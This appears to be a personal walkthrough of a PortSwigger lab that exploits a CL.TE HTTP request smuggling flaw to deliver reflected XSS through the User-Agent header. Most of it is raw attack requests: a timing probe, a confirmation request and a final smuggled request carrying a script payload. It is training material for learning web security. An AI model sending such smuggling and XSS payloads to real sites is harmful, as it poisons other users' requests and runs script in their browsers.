# [Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)

> smuggle an XSS exploit that executes alert(1)

- open the lab in burp browser
- send the one of the post like `/post?postId=4` request to the repeater
- check the `User-Agent` value in the response (it should be there)
- try to exploit it with a `<script>`

```
GET /post?postId=4 HTTP/2
...
User-Agent: "><script>alert(1)</script><span x="
...
```

- then open the responses in browser to check: **hamburger menu** -> **Open response in browser**
- this is what the victim should receive

## recon

- this request times out

```
POST / HTTP/1.1
Host: xxx.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked

3
qwe
x
```

- it is probably `CL.TE` vulnerable
- lets confirm it
- send the following request, then a `/` request, the second should return with `400`, what means that the chopped off part got attached to the second request

```
POST / HTTP/1.1
Host: xxx.web-security-academy.net
Content-Length: 75
Transfer-Encoding: chunked

0

GET /qwe HTTP/1.1
Content-Length: 3
Transfer-Encoding: chunked

x=
```

## exploit

- update the request with a post request and the **User-Agent** `XSS`

```
POST / HTTP/1.1
Host: xxx.web-security-academy.net
Content-Length: 100
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: x"/><script>alert(1)</script>
Content-Length: 3

x=
```
